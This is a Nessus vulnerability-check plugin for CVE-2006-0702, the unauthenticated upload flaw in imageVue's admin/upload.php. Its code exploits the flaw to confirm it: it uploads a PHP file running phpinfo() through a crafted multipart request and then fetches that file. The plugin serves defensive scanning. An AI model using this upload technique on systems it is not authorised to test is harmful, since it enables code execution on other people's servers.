#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20991);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2006-0702");
  script_bugtraq_id(16594);
  script_osvdb_id(23169);

  script_name(english:"imageVue < 16.2 admin/upload.php Unrestricted File Upload");
  script_summary(english:"Checks for unauthorized file upload vulnerability in imageVue");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows arbitrary
uploads." );
 script_set_attribute(attribute:"description", value:
"The remote host is running imageVue, a web-based photo gallery
application written in PHP. 

The installed version of imageVue allows unauthenticated attackers to
upload arbitrary files, including files containing code that can then
be executed subject to the privileges of the web server user id. 

In addition, it is also reportedly affected by information disclosure
and cross-site scripting vulnerabilities, although Nessus has not
checked for those issues." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/424745/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to imageVue 16.2 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/11");
 script_cvs_date("$Date: 2011/03/14 21:48:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/imagevue", "/imageVue", "/ImageVue", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Get a list of possible folders.
  w = http_send_recv3(method:"GET", item:string(dir, "/dir.php"), port:port);
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # If it looks like it's from ImageVue...
  if (
    '<?xml version="1.0"' >< res &&
    '<folder path="' >< res
  ) {
    # Find a folder that allows uploads.
    while (res) {
      res = strstr(res, '<folder path="');
      if (res) {
        attr = res - strstr(res, ">");
        folder = ereg_replace(pattern:'^.+ path="([^"]+/)" .+ perm="7.+', replace:"\1", string:attr);
        break;
        res = strstr(res, ">") - ">";
      }
    }

    # Try to upload a file.
    if (folder) {
      file = string(rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_"), "-", unixtime(), ".php");

      bound = "nessus";
      boundary = string("--", bound);
      postdata = string(
        boundary, "\r\n",
        'Content-Disposition: form-data; name="uploadFile"; filename="', file, '"', "\r\n",
        "Content-Type: application/x-php\r\n",
        "\r\n",
        "<?php phpinfo() ?>\r\n",

        boundary, "\r\n",
        'Content-Disposition: form-data; name="getpath"', "\r\n",
        "\r\n",
        "./../", folder, "\r\n",

        boundary, "--", "\r\n"
      );
      w = http_send_recv3(method: "POST",  port:port,
      	item: dir+"/admin/upload.php",
	content_type: "multipart/form-data; boundary="+bound,
	data: postdata);
      if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");

      # Finally, try to run the script we just uploaded.
      folder2 = urlencode(
         str:folder,
         unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*'()-]/"
      );
      w = http_send_recv3(method:"GET", item:string(dir, "/", folder2, file), port:port);
      if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
      res = w[2];

      # There's a problem if it looks like the output of phpinfo().
      if ("PHP Version" >< res) {
        security_hole(port);
      }
    }
  }
}
